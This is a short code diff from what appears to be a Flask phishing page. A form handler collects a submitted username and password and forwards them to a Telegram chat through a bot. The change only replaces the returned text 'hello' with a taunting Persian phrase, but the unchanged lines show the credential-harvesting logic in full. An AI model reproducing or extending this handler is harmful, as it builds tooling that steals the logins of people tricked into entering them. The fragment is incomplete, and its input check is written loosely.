@@ -16,7 +16,7 @@ def message():
         password = request.form.get('password')
         if usr or password != "":
             bot.send_message("YOUR CHAT ID", f"{usr}\n{password}")
-            return "hello"
+            return "chos hacker shodi?"
         else:
             flash('please input your username and password')
             return redirect(url_for('index'))
